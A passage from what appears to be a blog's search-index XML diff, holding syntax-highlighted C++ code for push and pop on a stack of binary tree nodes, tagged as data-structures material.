class="keyword">if</span> (!s.base) &#123;</span><br><span class="line">			<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">		&#125;</span><br><span class="line">		s.top = s.base + s.size;</span><br><span class="line">		s.size += STACKINCREMENT;</span><br><span class="line">	&#125;</span><br><span class="line">	*s.top++ = treeNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTNode <span class="title">pop</span><span class="params">(stack&amp; s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s.base) &#123;	</span><br><span class="line">		BiTNode e = (*--s.top);</span><br><span class="line">		(*s.top).data = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>数据结构</category>
+      </categories>
+      <tags>
+        <tag>-cpp -数据结构 -二叉树</tag>
+      </tags>
+  </entry>
+</search>
